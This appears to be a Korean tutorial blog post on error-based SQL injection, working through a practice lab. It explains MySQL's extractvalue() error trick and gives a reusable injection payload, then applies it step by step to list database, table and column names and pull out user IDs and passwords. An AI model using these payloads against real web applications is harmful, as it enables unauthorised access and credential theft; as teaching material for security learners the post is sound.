---
layout: single
title:  "SQL injection 데이터 추출(3)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. SQL injection 데이터 추출(3)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1 개요 </span>

<br>

저번 SQL injection 데이터 추출(2) 포스팅에서 DB데이터가 화면에 출력 될 때 SQL Injection을 해보았습니다.  
사실 데이터 추출 방식에는 3 가지 방식이 있습니다.

<br>

<span style='font-weight:bold; font-size:15px'>1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) => UNION SQLi (로그인 or 게시판 등)</span>

<span style='font-weight:bold; font-size:15px'>2. 에러 메세지가 화면에 출력 되는 경우 => Error Based SQLi (에러 메세지 확인 가능 한 곳)</span>

<span style='font-weight:bold; font-size:15px'>3. 참과 거짓으로 출력 되는 경우 => Blind SQLi (로그인 or 아이디 중복 체크 등)</span>

   와 같은 방식으로 해결할 수 있습니다. 

   <br>

   이번 포스팅에서는 2 번을 배워보도록 합시다.

<br>

## <span style="background:#696969; color:#ffffff">1.2  Error Based SQL Injection<span style="font-size:50%">(에러 메세지를 출력하여 화면에서 볼 수 있을때)</span></span>

<br>

### <span style="background:#909090; color:#ffffff">1.2.1 필요한 개념</span>

***

Error Based SQl Injection은 무엇일까요?  
에러 메세지를 활용해서 데이터를 출력하는 방식입니다.

활용하기 위해서는 조건이 필요합니다.

<br>

<img src="/images/2024-06-01-SQLinjection15/image-20240601034401789.png" alt="image-20240601034401789" style="zoom: 67%;" />

<br>

먼저 SQL에러가 무엇일까요?  
SQL에러는 SQL쿼리에서 발생하는 에러를 뜻합니다.

그렇다면 문법 에러와 로직 에러가 어떤 점이 다른 지 살펴보겠습니다.

<br>

<br>

 <span style='font-weight:bold; font-size:22px'> 〈문법 에러〉 </span>



<img src="/images/2024-06-01-SQLinjection15/image-20240601023835764.png" alt="image-20240601023835764" style="zoom: 60%;" />

문법 에러란 ?  sql 쿼리 문이 제대로 된 문법으로 작성되어서 sql에서 요구하는 언어적 문제가 있는지 없는지 보는 것입니다.   
만약 문법 에러가 난다면, 위와 같은 이미지처럼 SQL syntax라고 뜨며, SQL 요청이 거부되어 실행조차 될 수 없습니다.   
Error based SQLi (sql injection)는 sql이 작동하면서, 에러 메세지를 통해 데이터를 추출해내는 기법이므로 문법 에러가  
뜨지 않도록 주의해야 합니다.

<br>

<br>

<span style='font-weight:bold; font-size:22px'> 〈로직 에러〉 </span>

<img src="/images/2024-06-01-SQLinjection15/image-20240601025713759.png" alt="image-20240601025713759" style="zoom:80%;" />

위의 이미지처럼 작성한다면, 문법적으로 위배되지 않습니다. 하지만 text라는 column , hi 라는 값은 존재하지 않습니다.  
이처럼 제대로 된 지정된 값을 사용하지 않으면, 로직 에러가 나타나게 됩니다.   
<br>

그치만 위와 같이 쓴다면, 오류 메세지를 확인하는 것은 가능하나 데이터를 추출할 수 없습니다.

<br>



<span style='font-weight:bold; font-size:20px'>😊extractvalue()함수를  <span style='text-decoration: red wavy underline'>사용하는 이유:</span>😊</span>

`extractvalue ()` 함수는 XML 문자열에서 지정된 XPath 표현식에 해당하는 데이터를 추출하는 데 사용됩니다.

따라서 에러 메세지가 발생하면, XPath 표현식에 해당하는 데이터를 추출하면서 오류 메세지가 나타나기 때문에  
Error based SQLi에 사용하기 적합합니다.

<br>

<span style='font-weight:bold; font-size:20px'>😊extractvalue()함수를 <span style='text-decoration: red wavy underline'>사용하는 법:</span>😊</span>   
<br>

■<span style='font-weight:bold; font-size:20px'>[</span><span style= "font-size:19px">기본적인 함수 사용법</span><span style='font-weight:bold; font-size:18px'>]</span> (<span style= "color:red">참고</span>) 

<details>
<summary style="font-size:15px">접기/펼치기</summary>
<div markdown="1">
<br>extractvalue('xml 데이터', 'xml 표현식')<br>
`idx` 칼럼에 다음과 같은 XML 데이터가 저장되어 있다고 합시다:

```xml
<user>
<name>LEE</name>
<email>LEE@example.com</email>
</user>
```

```sql
SELECT EXTRACTVALUE(idx, '/user/name') FROM tableName;
```

이 쿼리는 `tableName`에서 `idx` 칼럼에 저장된 XML 데이터 중 `<user>` 태그의 하위 `<name>` 태그에 해당하는 값을 추출하여 `name`이라는 이름으로 반환합니다.     
`idx` 는 또한 ' 〈user〉 〈name〉 LEE 〈/name〉 〈email〉 LEE@example.com 〈/email〉 〈/user〉 '로 표현 가능.

```diff
+-----------+
|    name   |
+-----------+
|    LEE    |
+-----------+
```

열 제목은 'name'으로, 추출된 값은 "LEE"입니다.  
이러한 방식으로 LEE라는 데이터를 추출해 냅니다.

</div>
</details>
<br>

■<span style='font-weight:bold; font-size:19px'>[</span><span style= "font-size:19px">SQLi에서 함수 사용법</span><span style='font-weight:bold; font-size:18px'>]</span>  
<br>

<span style='font-size:17px ;line-height:20px; word-spacing:5px;letter-spacing : 3px'>※알아야 할 개념※</span>

<br>

👉<span style='font-size:17px'> `XPATH syntax error`가  발생하는 특수 문자</span>  

 <img src="/images/2024-06-01-SQLinjection15/image-20240601081057098.png" alt="image-20240601081057098" style="zoom:67%;" />



위 이미지처럼 xml 데이터는 상관없고, xml 표현 식에 : , ! , # , % 등등 특수 문자를 앞에 넣게 되면   
xpath syntax error가 뜨면서 해당 자리의 값이 추출하는 특징을 갖고 있습니다.  
이 데이터를 추출되는 것을 이용하여, select문을 삽입하여 db데이터를 추출하는 방법을 이용할 것입니다.

<br>

<span style='font-size:17px'> 👉`concat()`함수 </span>

concat('a','b') -----> ab  
concat('0x3a', 'test') ------> :test

ex)   : 의 16진수는 0x3a , !의 16진수는 0x21, #의 16진수는 0x23........

<br>

<br>

### <span style="background:#909090; color:#ffffff">1.2.2 데이터 추출의 과정<span style="font-size:50%">(에러 메세지를 화면으로 볼 수 있을 때)</span></span>

***

<br>

<span style='font-weight:bold; font-size:20px'>〈 Error Based 이용한 sql injection pocess 〉</span>

<br>

<span style='font-weight:bold; font-size:15px'>1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span>

<span style='font-weight:bold; font-size:15px'>2. 에러 출력 함수</span>

<span style='font-weight:bold; font-size:15px'>3. 공격 format 만들기</span>

<span style='font-weight:bold; font-size:15px'>4. DB이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>5. table이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>6. column 이름 확인하기</span>

<span style='font-weight:bold; font-size:15px'>7. data 추출하기</span>

   예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span>

***
<br>

기본적으로 Error Based SQLi를 적용하려면 SQL 에러를 화면에 출력 되어야 하므로,

<img src="/images/2024-06-01-SQLinjection15/image-20240601094626149.png" alt="image-20240601094626149" style="zoom:50%;" />

SQL에러 와 관련된 에러가 발생하는지 확인한다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.2  에러 출력 함수</span>

***
<br>

(대표적)**`EXTRACTVALUE()`**
or **`CAST()`**와**`CONVERT()`** 등을 이용.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span>

***
<br>

' and extractvalue('1',concat(0x3a,(select 'test'))) and '1'='1

<img src="/images/2024-06-01-SQLinjection15/image-20240601100910338.png" alt="image-20240601100910338" style="zoom:67%;" />

문법 에러가 나타나지 않으면서, 로직 에러가 나타나는 것 까지 확인 했습니다!

<br>

따라서 

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1

이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span>

***
<br>

DB 이름 확인하는 법은   
select database() 이므로,   
<br>

공격 format   
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.   
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select database() limit 0,1</span>))) and '1'='1

<img src="/images/2024-06-01-SQLinjection15/image-20240601101741238.png" alt="image-20240601101741238" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span>

***
<br>

table 이름 확인하는 법은  
select table_name from information_schema.tables where table_schema='DB name' limit 0,1 이므로,   
<br>

공격 format  
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.   
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema='segfault_sql' limit 0,1 </span>))) and '1'='1

<img src="/images/2024-06-01-SQLinjection15/image-20240601102131068.png" alt="image-20240601102131068" style="zoom:67%;" />[limit 0,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601102219083.png" alt="image-20240601102219083" style="zoom:67%;" />[limit 1,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601102338714.png" alt="image-20240601102338714" style="zoom:67%;" />[limit 2,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601102414956.png" alt="image-20240601102414956" style="zoom:67%;" />[limit 3,1]

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span>

***
<br>

column 이름 확인하는 법은  
select column_name from information_schema.columns where table_name='table name' limit 0,1 이므로,   
<br>

공격 format  
' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and '1'='1  
에 대입한다.  
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name='member' limit 0,1</span>))) and '1'='1

<img src="/images/2024-06-01-SQLinjection15/image-20240601102826831.png" alt="image-20240601102826831" style="zoom:67%;" />[limit 0,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601102900086.png" alt="image-20240601102900086" style="zoom:67%;" />[limit 1,1]	

<img src="/images/2024-06-01-SQLinjection15/image-20240601102928085.png" alt="image-20240601102928085" style="zoom:67%;" />[limit 2,1]	

<img src="/images/2024-06-01-SQLinjection15/image-20240601103001659.png" alt="image-20240601103001659" style="zoom:67%;" />[limit 3,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601103026201.png" alt="image-20240601103026201" style="zoom:67%;" />[limit 4,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601103053717.png" alt="image-20240601103053717" style="zoom:67%;" />[limit 5,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601103136119.png" alt="image-20240601103136119" style="zoom:67%;" />[limit 6,1]

<img src="/images/2024-06-01-SQLinjection15/image-20240601103203656.png" alt="image-20240601103203656" style="zoom:67%;" />[limit 7,1]

이런 식으로 컬럼을 알 수 있다.

<br>



#### <span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span>

***

<br>

같은 방식으로   
select flag from flagTable limit 0,1  
<br>

' and extractvalue('1',concat(0x3a,(<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>))) and '1'='1

<img src="/images/2024-06-01-SQLinjection15/image-20240601103508970.png" alt="image-20240601103508970" style="zoom:67%;" />

<img src="/images/2024-06-01-SQLinjection15/image-20240601103530142.png" alt="image-20240601103530142" style="zoom:67%;" />

doldol의 아이디와 비밀번호를 알 수 있습니다.

<br>

